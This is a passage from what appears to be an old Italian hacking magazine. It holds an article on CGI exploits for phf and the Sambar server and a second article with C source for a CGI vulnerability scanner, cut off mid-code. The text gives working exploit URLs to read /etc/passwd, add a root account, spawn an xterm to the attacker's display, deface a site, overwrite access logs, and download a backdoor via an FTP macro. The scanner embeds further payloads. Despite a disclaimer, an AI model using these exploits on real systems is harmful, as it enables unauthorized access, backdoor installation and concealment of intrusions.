tutto il resto e il server si blocca impedendo qualsiasi  altra operazione.  Di
solito sono i demoni a essere vulnerabili a questo tipo di attacco, un demone è
per definizione un programma che gira 24 ore su 24, per 7 giorni su 7 e che
svolge un servizio specifico come l'invio della posta, il prelievo di file e
così via. Della posta si occupa  un demone chiamato Sendmail, i siti web invece
sono "tenuti in piedi" da un programma chiamato Apache (proprio quello
di "powered by Apache" ), se il server  svolge anche la funzione di file-server
allora è  probabile che faccia girare il Samba. Un attacco D.O.S  comunque non
è pericoloso per il contenuto del sistema. Chi effettua un attacco di questo
tipo non riesce a entrarvi, lo blocca e basta. L'unico danno potrebbe essere di
natura economica. Per un grosso sito con migliaia di utenti al giorno rimanere
inattivo anche per sole 4 ore comporta perdite economiche. Diverso è il
discorso per gli exploit. Un exploit è una tecnica che sfrutta un bug o una
debolezza di un sistema e molto spesso con un exploit un hacker riesce ad avere
un accesso non autorizzato a un sistema. Una volta dentro poi potrebbe sempre
migliorare la sua posizione guadagnando ulteriori privilegi e in certi casi
sostituirsi all'amministratore. Tutto questo senza lasciare la minima traccia e
senza che nessuno si accorga di nulla. Un exploit famoso è quello del phf e
riguarda solo i server tipo unix (unix, sunos linux ecc ecc )
Il suo funzionamento è il seguente, se tra i cgi del server (vedremo dopo cos'è
un cgi) c'è un certo file chiamato phf allora si possono eseguire comandi come
se ci si trovasse in una shell di quel server. Vedere il contenuto del file delle
password senza vedere nemmeno il server "fisicamente" non è poi così impossibile
come sembra, basta scrivere nel browser questa stringa.

http://www.sito.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd


sostituendo naturalmente www.sito.com col server da exploitare.
Questo equivale a scrivere

/bin/cat /etc/passwd

da console e che, guarda caso, serve proprio per vedere il contenuto del file
di cui noi possiamo leggere il risultato comodamente sul nostro browser di
casa. Inutile dire che se si riesce a decriptare una password si ottiene una
shell su quel sistema e con un po' di fortuna anche il root. Comunque,
anche senza decriptare nessuna passowrd, se il phf gira coi permessi del root
(normalmente però gira come utente nobody) chi attacca può provare a farsi
un account su misura.

http://www.sito.com/cgi-bin/phf?Qalias=x%0a/usr/bin/id

Per vedere con che privilegi gira; se viene fuori uid=0 e gid=0 vuol dire che
gira come root e allora si potrebbe fare:

http://www.sito.com/cgi-bin/phf?Qalias=x%0aecho%20%22hkd%3A%3A0%3A0%3A/bin/bash
%3A /home/hkd%22%20>>%20/etc/passwd

equivalente di echo "hkd::0:0:/bin/bash:/home/hkd" >> /etc/passwd che aggiunge
un nuovo utente  al file delle password e gli dà gli stessi privilegi del root.

Questo comunque era solo un esempio di come andavono le cose in passato,
ormai il phf non esiste quasi più, BADATE BENE HO DETTO QUASI, da nessuna parte;
l'80% di quelli che si trovano ancora sono corretti, in più l'introduzione dei
file shadow ha risolto il problema visto che anche se si edita il file delle
password non si vedono le password che stanno su di un altro file protetto
da lettura. Proprio per il fatto che quello del phf è un exploit vecchio e
famoso queste cose magari le avete già sentite dire e/o lette altrove.
Chiedo scusa, però pensate anche a chi invece non lo conosceva e magari ne
vuole sapere un po' di più. Torniamo al nostro phf e diciamo che proprio
per come è stato concepito un sistema  Unix si può trasferire tutto
quello che normalmente si vede su schermo su di un'altra maccchina. Un
programma gira sul computer A ma lo schermo su cui si vede l'output è
quello collegato al computer B. Sembra una cosa alquanto
stravagante però è fattibile. Basta che la seconda macchina sia pronta ad
ospitare l'output della prima prestandogli il suo X server (ambiente grafico
di base ) e che la prima sia d'accordo inviandogli i suoi dati. Allora qual'è
la più ambita applicazione unix su cui si vorrebbe mettere le mani? Io direi
proprio un bel Xterm visto che ci dà la shell di chi lo invoca. Per chi non lo
sapesse un Xterm è qualcosa di molto simile al "prompt di ms-dos" sotto Windows
9x, una finestrella con tanto di prompt pronta a ricevere ed eseguire comandi
(e scusatemi se  è poco). Veniamo al dunque per attivare questo exploit chi
fa l'attacco dovrà disporre di una macchina su cui gira un X server...
Linux è perfetto. Da una sua console digiterà

xhost +ipdelserverdaexploitare

che serve a far capire a Linux che dovrà tenersi pronto a ricevere
l'output dal server. A questo punto deve convincere un user di quel server ad
aprire un Xterm e reindirizzare l'output sul computer dove è stato fatto xhost;
ma prima abbiamo detto che il phf è come se fosse lanciato dall'utente nobody quindi:

http://ipdelserverdaexploitare/cgi-bin/phf?Qalias=x%0a/usr/openwin/bin/xterm
+-display+ipdelcomputerdellhacker:0

Dopo qualche secondo aparirà come per magia un Xterm con dentro un prompt dei
comandi. Se ancora non avete capito ora è come se l'hacker fosse un user
qualsiasi di quel server!!! Non ha bisogno di una password per entrare perchè
in fondo nobody è un account di sistema e non ha password e poi dal momento che
lancia il comando xterm+-display ecc ecc vuol dire che è già entrato :-) Notare
che il file di log del web-server contiene una sola riga che attesta
l'attività dell'hacker e anche il suo vero ip. Per il resto è difficile
accorgersi di un'intrusione con questo metodo perchè nobody, come già detto, è
un account di sistema quindi si parte dal concetto (sbagliato) che nessuno può
entrare telnettando il server e loggandosi con nobody. Ammesso che lo Unix in
questione registri le azioni anche di questo utente è bene controllarle di
frequente se si ha il phf.


Prima ho detto che il phf è un cgi senza spiegare cos'è un cgi.
CGI e una sigla che sta per Common Gateway Interface,in pratica sono dei
programmi richiamati dalle pagine web, eseguiti dal server. Per esempio per
registrare un account da qualche parte bisogna compilare una pagina che chiede
nome, cognome, indirizzo ecc. Poi si clicca su un pulsante ed ecco che parte il
cgi (anche se noi non lo vediamo) che prende tutti i nostri dati, li archivia
in un database, crea qualche file e cartella sul computer remoto e poi termina
portandoci col browser a quella che potrebbe essere la nostra nuova mailbox.
Magari navigando vi sarete imbattuti in qualcosa simile a

http://www.sito.com/cgi-bin/search?pippo+topolino%20it%20full


Questo non è un indirizzo come gli altri ma è una chimata a un cgi, per semplicità
può  essere immaginata come una riga di un comando ms-dos (linux se vi piace di
più )  con nome del programma e parametri dove
http://www.sito.com è il sito che stiamo visitando /cgi-bin/ è la cartella in
cui di solito  vengono raggruppati tutti i cgi, search è il cgi (il comando vero
e proprio, tipo "dir" ) ?pippo+topolino%20it%20full sono i suoi parametri di
funzionamento.

Un cgi non può essere scaricato, scrivendo il suo indirizzo nel
browser, a  differenza di tutti gli altri file contenuti nel sito, questo va
subito in esecuzione. Da qui si capisce l'importanza che questi programmi non
contengano errori o che permettano di fare solamente ciò per cui sono stati
progettati. Per continuare il discorso sui cgi vediamo che esistono delle convenzioni
per i parametri da passare. Non si possono usare gli spazi ma se questi sono
necessari per separare due parametri si inserisce al posto degli spazi il loro
codice esadecimale (20) preceduto dal   simbolo %

parametro1%20parametro2

Lo stesso vale per il + , la @, il #.

SPAZIO      %20 o +
#           %23
$           %24
%           %25
&           %26
+           %2B
,           %2C
.           %2E
@           %40
"           %22
:           %3A
;           %3B


Bene gente abbiamo finito con le nozioni di base, se servirà qualcosa di più lo
scriverò al momento, adesso iniziamo a vedere un exploit più recente del phf ma
altrettanto pericoloso.


(in)sicurezza del Sambar Server.

Sambar (occhio alla r finale che lo distingue dal Samba che è un altro server)
è un demone web per windows 9x/Nt semisconosciuto. Arrivato ormai alla versione
4 e oltre è ancora lontano dal essere un programma sicuro anzi diciamo pure
che è più bucato di un colabrodo.
Il primo bug riguarda il sistema di gestione dei cgi. Come le prime versione
del più noto IIS se tra i cgi  abbiamo anche un solo .BAT o .CMD chiunque
potrebbe far eseguire al server comandi a piacere come se fosse nientemeno
che sua altezza l'admin. Ok però perchè si dovrebbero trovare dei file .BAT
nella directory /cgi-bin/ ? Perchè uno ce lo mette proprio il programma di
installazione, un piccolo file di nome Hello.Bat che una volta richiamato
scrive il classico "Hello World" sul browser poi termina. Se lo editate dentro
troverete solo queste 2 misere righe.

-------Hello.bat begin--------
@echo off
echo Hello World
-------Hello.bat end----------

Adesso vediamo come la congiunzione hello.bat + admin@poco.sveglio possa
provocare intrusioni  e/o danni in massa. Tutto sta nel far credere al Sambar
che il comando che si vuole far eseguire si trovi dentro al file Hello.BAT
e per farlo basta aggiungere all'url del cgi ?&  e il comando da eseguire
facendo attenzione a sostituire gli spazi con dei + e tutti i caratteri un po'
"particolari" con il loro valore esadecimale preceduto dal simbolo %.
Vogliamo farci un'idea del contenuto dell'hard disk?

http://www.sito.com/cgi-bin/hello.bat?&dir+c:\

ed ecco che sul browser comparirà una lista di tutti i file presenti in c:\
L'output non verrà  formattato in maniera perfetta però funziona. Oltretutto
questo server fa girare i cgi con permessi di root quindi non si hanno
limitazioni di sorta, si può entrare ovunque e eseguire quello che vuole.
Ecco come un hacker malizioso potrebbe lasciare una traccia del suo passaggio
sul desktop dell'administrator così che appena loggato si trova un file
hacked.txt, lì sul desktop come messaggio di benvenuto.

http://www.sito.com/cgi-bin/hello.bat?&echo+Hacked+by+System+Failure+%3E%3E+
c:\winnt\profiles\administrator\desktop\hacked.txt

%3E equivale a > quindi con echo scrive il suo messaggio separando le parole
con degli spazi (+)  poi ridirige l'output su un file hacked.txt. Ok ci sono
sempre i log ma se dall'altra parte c'è uno che ci sa fare con questi vantaggi
non sono un problema così grosso.

194.138.47.16 - - [15/Feb/2000:05:49:04 +0100] "GET
/cgi-bin/hello.bat?&echo+hacked+by+sysfail+>> +c:\winnt\profiles\
sysfail\desktop\hacked.txt HTTP/1.1" 200 0 261 "http://www.microsoft.com/"
"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)"

Questo è il log dell'esempio precedente: ci dice che l'ip 194.138.47.1 si è
connesso al server  alle il 15/Feb/2000 alle ore 05:49:04, ha fatto la
richiesta provenendo dalla pagina http://www.microsoft.com/ con l'Internet
Explorer su un Win 98. Però chi ci assicura che 194.138.47.16 non sia un server
proxy? Senza contare che gli altri dati potrebero essere tutti falsi ... in
fondo basta il telnet per falsificarli.  Questo poi ammesso che il file log
sia ancora "buono" perchè si potrebbe sempre decidere di cancellare il file
dei log, un file di nome access.log, posizionato nella sottodirectory /log
di quella dove è installato il Sambar. Tuttavia facendo del+access.log l'unica
risposta sarebbe un messaggio che ci informa che il file non può essere cancellato
perchè è in uso (dal Sambar stesso) .... Vabè,  il file non può essere cancellato
ma può essere sovrascritto con un altro, magari di lunghezza 0. Per la cronaca
un file di lunghezza 0 si trova  nella stessa directory di access.log e si chiama
isapi.log.

http://www.sito.com/cgi-bin/hello.bat?&copy+c:\pathdelsambar\log\isapi.log+c:\p
athdelsambar\log\access.log

Tra l'altro in questo modo si rendono anche vani i tentativi di recupero con
undelete & co. (il file non è stato cancellato ma modificato) Adesso che
abbiamo visto che c'è un modo per cancellare le tracce è evidente che chi
attacca può fare veramentequello che vuole (la cancellazione del sito è cosa da
5 minuti ma di solito sono i lamer che fanno queste cose) Personalmente penso
che un hacker degno di questo nome troverebbe più divertente cercare di sfruttare
al massimo questi vantaggi uploadando file che una volta dentro al server andrà ad
eseguire. La cosa è un po' complessa ma rimane fattibile. Prima di tutto bisognerebbe
decidere cosa uploadare e lo si metterà in uno spazio ftp anonimo, o comunque dove c'è
il permesso di scrittura e la sicurezza di non essere rintracciati tramite questo:P
Fatto ciò bisogna iniziare a lavorare sul Sambar per trovare il modo di
fargli scaricare quella roba... uhmmm il comando ftp permette di eseguire delle
macro quindi, con un solo comando, si potrebbe

1) collegarsi all'ftp dove abbiamo messo i file che ci interessano
2) dare login e password
3) settare un trasferimento binario
4) scaricare il/i file

Ecco qui come verrà costruita la macro (un comune file di testo)

http://www.sito.com/cgi-bin/hello.bat?&echo+anonymous+>>+c:\macro.txt

http://www.sito.com/cgi-bin/hello.bat?&echo+guestpswd+>>+c:\macro.txt

http://www.sito.com/cgi-bin/hello.bat?&echo+binary+>>+c:\macro.txt

http://www.sito.com/cgi-bin/hello.bat?&echo+get+backdoor.exe+
c:\winnt\backdoor.exe+>>+c:\macro.txt

adesso abbiamo macro.txt in c:\ che una volta eseguita scarica il file
backdoor.exe e lo mette in c:\winnt

-------Macro.txt begin--------
anonymous
guestpswd
binary
get backdoor.exe c:\winnt\backdoor.exe
. . .
-------Macro.txt end--------

Per eseguire la macro

http://www.sito.com/cgi-bin/hello.bat?&ftp+%2Ds:c:\macro.txt+ftp.xxxxx.com

Rimuoverla poi dal server per non lasciare traccia.

http://www.sito.com/cgi-bin/hello.bat?&del+c:\macro.txt

Nello stesso modo è possibile modificare il sito internet. L'unica differenza è
che invece di  scaricare un eseguibile si scaricheranno delle pagine html.
Basterà dare un'occhiata al file di configurazione del sambar per vedere dov'è
l'http root e mettere lì il nuovo index.html. Breve parentesi: l'http root è la
cartella principale del server web in cui è contenuta la homepage. Quando noi
visitiamo www.sito.com ci troviamo all'interno della http root, se ci spostiamo
in www.sito.com/members allora entriamo in una sottodirectory della http root.
Schematicamnte possiamo pensare a una cosa del genere

www.sito.com
   |
   ----members

Tuttavia nel server non c'è nessuna cartella di nome www.sito.com, il nome è un nome
"virtuale" in realtà l'http root può benissimo chiamarsi docs o www o con qualsiasi
altro nome. Inoltre l'http root non coincide mai con la root del disco

così nella realtà abbiamo

c:\
  |
  ---programmi
       |
        --- webserver
             |
              ---- docs   <-- questa è l'http root
                     |
                      ---members

Ma vediamo

www.sito.com
   |
    --- members

Ok torniamo a noi, ecco come si può sapere dove sono le pagine html

http://www.sito.com/cgi-bin/hello.bat?&type+c:\programmi\sambar\config\config.ini

Documents Directory = /docs/ <---questo è la directory http root con i file html

Teoricamente uno può anche scaricarsi il log file, cancellare tutte e sole le
sue tracce, poi ricaricarlo nel server e fare finta che non sia successo nulla
fischietando allegramente. Se ne server c'è installatoanche il resource pack
allora da qualche parte dovrebbe esserci il comando shutdown.exe che può essere
usato per *spegnere* il computer.

http://www.sito.com/cgi-bin/hello.bat?&shutdown+/L+/Y+/T:60+/C+ciao+ciao

60 sec allo shutdown con tanto di messaggio di avviso.

Questo exploit però e realizzabile solo se il server è Windows NT con Windows
95/98 non funziona.  Chi mi ha seguito fino ad ora (GRAZIE) magari si ricorderà
del fatto che all'inizio ho detto che il Sambar è come un colabrodo fatto
di Hemmental(TM)... ebbene si! c'è anche la possibilità di fare un attacco
D.O.S. e far crashare il server (ver 4.3 e inferiori gli altri non zo)

Prendere il telnet, collegarsi alla porta 80 del server e digitare

GET

tenere premuto invio fino a quando la connessione non viene chiusa per morte
quasi naturale del  demone.


Altro modo: Fare come prima ma digitare

GET

GET

G

G

Kaput stecchito!

Ah, se pensate che questo server lo abbia usato solo io per scrivere l'articolo
provate a  fare una bella ricerca in Internet con Altavista mettendo
nell'advanced search "powered by sambar" e vedrete una certa quantità di siti
potenzialmente insicuri. Mi raccomando non fate nulla di quello che vi ho detto
che è possibile fare perchè qui, come avrete già capito, analizziamo i problemi
 relativi alla sicurezza e non insegnamo a bucare sistemi.

= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =

= *************************************************************************** =
= ========================== [ CGI SCANNER X LINUX ] ======================== =
= *************************************************************************** =
Autore: SySF4|L


PREMESSA
========
questo è un articolo che spiega come funziona un cgi scanner, la conoscenza del
linguaggio C non è indispensabile però aiuta. Purtroppo adesso non ho nè
tempo nè voglia di scrivere un manuale di C (400 e più pagine). Il sorgente
completo lo trovate alla fine e, se volete, lo potete compilare con:

gcc -c file.c -o file.o
gcc file.o -o cgiscan

L'assegnazione del permesso di esecuzione al file cgiscan dovrebbe essere
automatica in caso contrario ->  chmod +x cgiscan e runnate con ./cgiscan.

                               -end of premessa-


In giro per la rivista ci dovrebbe essere un mio articolo dove si parla di
alcuni cgi bacati. Se non avete idea di cosa sia un cgi consiglio di leggere
prima l'altro articolo che spiega un po' come stanno le cose. In questo spazio
invece cercheremo di costruire un cgi-scanner cioè un programmino che ricerca i
cgi exploittabili all'interno di un server. Nota bene: non è che tutti i server
contengano cgi. Se al sito non servono non ci sono, se, per esempio, l'unico
scopo del sito è quello di far vedere le foto dei prodotti di una ditta e il
suo indirizzo e-mail, dei cgi può fare benissimo a meno e, anzi, sarebbe sbagliato
da parte dell'admin lasciare cgi inutilizzati. Ok, torniamo a noi, il problema è:
<<come si può fare a vedere se un cgi esiste o meno?>> (ma lo stesso vele per un
qualsiasi altro file che ci interessa) Ci si potrebbe mettere lì con il browser
a provarli uno a uno

http://www.sito.com/cgi-bin/phf

però non è tanto comodo. E poi per un certo verso l'unica risposta chiara la si
ha quando il cgi NON C'E', quando insomma il server dice "error 404" = file not found.
Il fatto è che il server risponde sempre e comunque con un messaggio di errore
solo che noi vediamo solamente quelli che ci informano di una cosa andata
storta, tipo il 404 appunto. Quando invece il file (cgi) c'è la risposta è un
error 200 solo che il browser non ce lo fa vedere e ci mostra il file (o esegue il cgi).
Per ovviare a questo inconveniente si potrebbe "scendere di livello" e usare il telnet.
Telnet nella sua semplicità permette anche di navigare *azz sono parole grosse*
però in fondo può scaricare una pagina html oppure ordinare l'esecuzione di un cgi.
La richiesta più semplice in assoluto si fa telnettando sulla macchina remota alla porta
80 (http)

GET /nomefile HTTP/1.0
invio
invio

ecco che appare la risposta completa. Tra cui vediamo anche un "200 OK" se
il file richiesto essite oppure "error 404" se non c'è. Però così è ancora più
scomodo!!! Il backspace non funzia e se uno sbaglia a scrivere...  pazienza
deve riscrivere tutta la richiesta da capo :( Pensate poi a scannare 30 e più
cgi in questo modo che inferno che deve essere. Direi che vale la pena cercare
di scrivere un programma che svolga questo compito per noi. Ho spiegato come si
fa una richiesta con il telnet perchè il cgiscanner si comporterà nello stesso
identico modo di un client telnet, solo che sarà automatizzato. Basterà dargli
l'host e lui penserà a cercare i cgi bacati dicendoci quali trova e quali no.
Il funzionamento, che a prima vista potrebbe sembrare complicato, si può
schematizzare così


1) ricerca dell'indirizzo
2) connessione alla porta 80
3) invio della richiesta
4) lettura della risposta
5) ricerca della stringa "200 OK" nella risposta del server
6) chiusura della connessione

Ognuna di queste cose si fa con poche righe di C, nel dettaglio:

1) Attraverso un DNS ricerca l'host da controllare ... se non lo trova stampa
   un messaggino di errore e poi esce dal prog. Quella che fa tutto è la
   funzione di libreria gethostbyname che vuole come input una stringa che
   altro non è che il primo parameto che abbiamo passato dalla linea di comando
   e che non a caso rappresenta l'indirizzo da scannare.

   if ((he=gethostbyname(argv[1])) == NULL){
      herror("Non riesco a trovare l'host :( ");
      exit(0);
   }

2) La parte più complicata; la connessione all'host a una determinata porta.
   Ovviamente se non ci riesce stampa un altro messagino di errore ed esce.

   inizio=inet_addr(argv[1]);
   pos=ntohl(inizio);
   sock=socket(AF_INET, SOCK_STREAM, 0);
   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
   sin.sin_family=AF_INET;
   sin.sin_port=htons(80);

   if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0){
      perror("Non riesco a connettermi all'host :( ");
      exit(0);
   }


3) Una delle parti più semplici; buff[contatore] si può immaginare come una
   lista delle richieste da fare, messe una sotto l'altra.

   --------------------
   GET /cgi1 HTTP/1.0
   -------------------
   GET /cgi2 HTTP/1.0

   contatore decide quale richiesta inviare di volta in volta specificando la
   "riga", però serve conoscere anche quanto è lunga la stringa della richieta
   ed ecco allora che la funzione strlen ci viene in aiuto. Non resta che
   decidere il sock da usare e poi inviare con la procedura send.

   send(sock,buff[contatore],strlen(buff[contatore]),0);

4) Ora bisogna leggere la risposta del server sullo stesso sock (canale di
   comunicazione) usato per la domanda. I dati provenienti dalla rete che si
   leggono con recv verranno immagazzinati dentro a una stringa (buffer)
   che "entra" nella procedura vuota e ne "esce" col la risposta.

   recv(sock, buffer,0,0);


5) Non resta che cercare il messaggio "200 OK"
   nella stringa appena arrivata. Strstr fa proprio questa funzione, cerca una
   stringa all'interno di un'altra e restituisce la locazione di memoria in cui
   si trova la prima ricorrenza. A noi non interessa tanto DOVE STA ma SE C'E'
   cioè se il risultato (cgistr) è diverso dal nulla, se qesto accade
   allora si è verificato l'error 200 = file esistente, quindi il cgi esiste

   cgistr = strstr(buffer,"200 OK");

6) Chiudere il sock e ricominciare dal punto 2 passando al cgi successivo

   close(sock);


Adesso che il cgi-scanner funziona lo si può perfezionare in vari modi, per
esempio facendo sì che l'utente possa scegliere anche la porta su cui
indirizzarlo (nel caso che un sito si trovi su di una porta diversa da 80),
oppure facendogli controllare anche il tipo di server. In particolare se
volessimo vedere la vesione di un demone http col telnet dovremmo fare una
richiesta del tipo.

HEAD / HTTP/1.0
invio
invio

E adesso l'omaggio della ditta: il sorgente bello e pronto per essere
compilato. Una volta ottenuto l'eseguibile (che supponiamo di chiamare
cgiscan)  l'unico parametro necessario per il funzionamento è l'host da
scannare che potete dare sia sottoforma di nomehost che di indirizzo ip

./cgiscan 123.123.123.123 oppure ./cgiscan www.xxxxx.com

Le opzioni aggiuntive sono una porta nel caso il sito non si trovi sulla 80

./cgiscan 123.123.123.123 8080

Volendo possiamo vedere anche il tipo di server con -t oppure vedere solo il
tipo di server senza scannare per i cgi con -T

./cgiscan 123.123.123.123 -t oppure
./cgiscan 123.123.123.123 -T

Infine se mettiamo anche un -i possiamo vedere qual'è l'exploit dei cgi che
trova.

/*------------------------- COPIA DA QUI -------------------------------*/ 

/***************************************************************************\
* Security System CGI scanner.                                              *
* ver 1.0                                                                   *
\***************************************************************************/

#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/nameser.h>
#include <sys/stat.h>
#include <strings.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>


/* Il programma parte da questa che è la funzione principale la quale tra
   l'altro si aspetta dei parametri che noi le passeremo da linea di comando */

int main(int argc, char *argv[])
{

 char msgtrovato[] = "200 OK";
 /* Ricerchiamo questa piccola stringa all'interno della stringa di risposta
    del server. Notare che ho messo anche OK perchè altrimenti 200 messaggio
    di errore = trovato si confonderebbe con la data 2000 = anno e il
    risultato sarebbe un cgiscanner che trova tutti i cgi (almeno fino al
    2010) */

 int porta = 80;
 /* I server web di solito lavorano sulla porta 80 */

 int numerocgi = 33;
 /* Per adesso cerchiamo i 31 cgi bacati più comuni */

 char *buff[numerocgi+1];
 /* In questo vettore di stringhe ci sono i comandi per richiamare i CGI con
    il protocollo http (GET <url> HTTP/1.0) 1 cgi per riga da 0 a numerocgi */

 char *nomecgi[numerocgi+1];
 /* In questo vettore di stringhe invece i nomi dei cgi che ci servono solo ed
    esclusivamente per l'output */

 char *hack[numerocgi+1];
 /* in questo terzo vettore invece potremmo memorizzare un promemoria*/

 int sock;
 /* questo è l'indice del sock che verrà aperto */

 struct in_addr addr;
 struct sockaddr_in sin;
 struct hostent *he;
 /* queste invece sono le trutture dati che conterranno le informazioni del
    sock e dell'host che stiamo scannando */

 int lungbuffer=1024;
 /* Questo limita la capacità di lettura delle risposte del server ai primi
    1024 byte...però sono più che suff. */

 char buffer[lungbuffer];
 /*Ci serve per contenere le risposte del server */

 char *cgistr;
 /*Se un cgi esiste questo puntatore assume un valore non NULL */

 int contatore=0;
 int i;
 int modo=0;
 int info=0;

 unsigned long inizio;
 unsigned long fine;
 unsigned long pos;


 /* Riempiamo il buffer con i comandi corretti */

 buff[1] =  "GET /cgi-bin/UnlG1.1 HTTP/1.0\n\n";
 buff[2] =  "GET /cgi-bin/phf HTTP/1.0\n\n";
 buff[3] =  "GET /cgi-bin/Count.cgi HTTP/1.0\n\n";
 buff[4] =  "GET /cgi-bin/test-cgi HTTP/1.0\n\n";
 buff[5] =  "GET /cgi-bin/nph-test-cgi HTTP/1.0\n\n";
 buff[6] =  "GET /cgi-bin/php.cgi HTTP/1.0\n\n";
 buff[7] =  "GET /cgi-bin/handler HTTP/1.0\n\n";
 buff[8] =  "GET /cgi-bin/webgais HTTP/1.0\n\n";
 buff[9] =  "GET /cgi-bin/websendmail HTTP/1.0\n\n";
 buff[10] = "GET /cgi-bin/webdist.cgi HTTP/1.0\n\n";
 buff[11] = "GET /cgi-bin/faxsurvey HTTP/1.0\n\n";
 buff[12] = "GET /cgi-bin/htmlscript HTTP/1.0\n\n";
 buff[13] = "GET /cgi-bin/pfdispaly.cgi HTTP/1.0\n\n";
 buff[14] = "GET /cgi-bin/perl.exe HTTP/1.0\n\n";
 buff[15] = "GET /cgi-bin/wwwboard.pl HTTP/1.0\n\n";
 buff[16] = "GET /cgi-bin/www-sql HTTP/1.0\n\n";
 buff[17] = "GET /cgi-bin/view-source HTTP/1.0\n\n";
 buff[18] = "GET /cgi-bin/campas HTTP/1.0\n\n";
 buff[19] = "GET /cgi-bin/aglimpse HTTP/1.0\n\n";
 buff[20] = "GET /cgi-bin/man.sh HTTP/1.0\n\n";
 buff[21] = "GET /cgi-bin/AT-admin.cgi HTTP/1.0\n\n";
 buff[22] = "GET /cgi-bin/filemail.pl HTTP/1.0\n\n";
 buff[23] = "GET /cgi-bin/maillist.pl HTTP/1.0\n\n";
 buff[24] = "GET /cgi-bin/jj HTTP/1.0\n\n";
 buff[25] = "GET /cgi-bin/info2www HTTP/1.0\n\n";
 buff[26] = "GET /_vti_pvt/service.pwd HTTP/1.0\n\n";
 buff[27] = "GET /_vti_pvt/users.pwd HTTP/1.0\n\n";
 buff[28] = "GET /_vti_pvt/authors.pwd HTTP/1.0\n\n";
 buff[29] = "GET /cgi-dos/args.bat HTTP/1.0\n\n";
 buff[30] = "GET /cgi-win/uploader.exe HTTP/1.0\n\n";
 buff[31] = "GET /cgi-bin/hello.bat HTTP/1.0\n\n";
 buff[32] = "GET /cgi-bin/count.c HTTP/1.0\n\n";
 buff[33] = "GET /cgi-bin/whois_raw.cgi HTTP/1.0\n\n";

 /* Rispettando l'ordinamento fissato nel buffer scriviamo nel vettore nomecgi
    solo i nomi dei cgi (magari mettiamo anche gli spazi per un output più
    ordinato) */

 nomecgi[1] =  "UnlG (backdoor)";
 nomecgi[2] =  "phf            ";
 nomecgi[3] =  "Count.cgi      ";
 nomecgi[4] =  "test-cgi       ";
 nomecgi[5] =  "nph-test-cgi   ";
 nomecgi[6] =  "php.cgi        ";
 nomecgi[7] =  "handler        ";
 nomecgi[8] =  "webgais        ";
 nomecgi[9] =  "websendmail    ";
 nomecgi[10] = "webdist.cgi    ";
 nomecgi[11] = "faxsurvey      ";
 nomecgi[12] = "htmlscript     ";
 nomecgi[13] = "pfdisplay      ";
 nomecgi[14] = "perl.exe       ";
 nomecgi[15] = "wwwboard.pl    ";
 nomecgi[16] = "www-sql        ";
 nomecgi[17] = "view-source    ";
 nomecgi[18] = "campas         ";
 nomecgi[19] = "aglimpse       ";
 nomecgi[20] = "man.sh         ";
 nomecgi[21] = "AT-admin.cgi   ";
 nomecgi[22] = "filemail.pl    ";
 nomecgi[23] = "maillist.pl    ";
 nomecgi[24] = "jj             ";
 nomecgi[25] = "info2www       ";
 nomecgi[26] = "service.pwd    ";
 nomecgi[27] = "users.pwd      ";
 nomecgi[28] = "authors.pwd    ";
 nomecgi[29] = "args.bat       ";
 nomecgi[30] = "uploader.exe   ";
 nomecgi[31] = "hello.bat      ";
 nomecgi[32] = "count.c        ";
 nomecgi[33] = "whois_raw.cgi  ";

 /* E infine ricordiamo gli exploit per ciascun cgi*/

 hack[1] =  "";
 hack[2] =  "http://url/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd";
 hack[3] =  "vedere l'exploit su       www.rootshell.com";
 hack[4] =  "http://url/cgi-bin/test-cgi?/*";
 hack[5] =  "http://url/cgi-bin/nph-test-cgi?/*";
 hack[6] =  "http://url/cgi-bin/php.cgi?/etc/passwd";
 hack[7] =  "http://url/cgi-bin/handler/useless-shit;cat%20/etc/passwd|?data=Download";
 hack[8] =  "vedere l'exploit www.hack.pl/bohun/exploits/daemons/cgi/cgi/";
 hack[9] =  "vedere l'exploit www.hack.pl/bohun/exploits/daemons/cgi/cgi/";
 hack[10]="http://url/cgi-bin/webdist.cgi?distloc=;/usr/bin/X11/xterm%20-display%20hackerip:0.0%20-ut%20-e%20/bin/sh";  
 hack[11] ="http://url/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd";
 hack[12] = "http://url/cgi-bin/htmlscript?../../../../passwd";
 hack[13] = "http://url/cgi-bin/pfdisplay?../../../../passwd";
 hack[14] = "interpreta qualsiasi comando perl :P";
 hack[15] = "vedere l'exploit su       www.rootshell.com";
 hack[16] = "http://url/cgi-bin/www-sql/documento/protetto.html";
 hack[17] = "http://url/cgi-bin/view-source?../../../../passwd";
 hack[18] = "http://url/cgi-bin/campas?%0acat%0a/etc/passwd%0a";
 hack[19]
="http://url/cgi-bin/aglimpse/80|IFS=5;CMD=5mail5your_address\\@your_computer";  
 hack[20] = "";
 hack[21] = "";
 hack[22] = "";
 hack[23] = "";
 hack[24] = "";
 hack[25] = "http://url/cgi-bin/info2www/../..passwd";
 hack[26] = "";
 hack[27] = "";
 hack[28] = "";
 hack[29] = "http://url/cgi-bin/args.bat?&comando";
 hack[30] = "con un form fatto apposta si riesce a uploadare qualsiasi file";
 hack[31] ="http://url/cgi-bin/hello.bat?&comando";
 hack[32] ="vedere l'exploit www.hack.pl/bohun/exploits/daemons/cgi/cgi/";
 hack[33] ="http://url/cgi-bin/whois_raw.cgi?fqdn=%0acat%20/etc/passwd";


 if (argc<2){
   printf("\nS.S. CGI scanner \n");
   printf("\nIstruzioni per l'uso: %s host <porta> <-t | -T> <-i>",argv[0]);
   printf("\nPorta se omesso viene settato per default sulla 80.  ");
   printf("\nCon -t si controlla anche il tipo di server          ");
   printf("\nCon -T invece si controlla SOLO il tipo di server    ");
   printf("\nIl parametro -i mostrare un breve riassuno degli exploit\n\n");
   exit(0);   }

 /* Ops... l'utente non ha messo parametri quindi ecco che se ci sono meno di 2
    parametri (incluso il nome del prog.) stampiamo un messaggio che lo informa
    del corretto utilizzo  */

 if (argc>2){
    if(strcmp("-t",argv[2])==0){modo=1;}
    if(strcmp("-T",argv[2])==0){modo=2;}
